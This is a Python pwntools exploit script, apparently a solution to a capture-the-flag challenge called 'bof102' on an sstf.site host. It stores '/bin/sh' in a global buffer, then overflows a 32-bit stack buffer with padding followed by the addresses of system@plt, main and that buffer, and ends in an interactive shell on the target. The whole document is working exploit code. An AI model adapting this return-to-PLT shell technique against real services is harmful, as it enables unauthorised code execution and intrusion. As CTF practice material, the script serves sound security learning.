#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bof102")


def start(argv=[], *a, **kw):
    # nc bof102.sstf.site 1337
    host = args.HOST or 'bof102.sstf.site'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

name = elf.symbols["name"]

io.sendlineafter(b"Name > ", b"/bin/sh")

pad = 0x10
payload = b"A" * pad
payload += p32(elf.bss(0x200))
payload += p32(elf.plt["system"])
payload += p32(elf.symbols["main"])
payload += p32(name)

io.sendlineafter(b" > ", payload)

io.interactive()
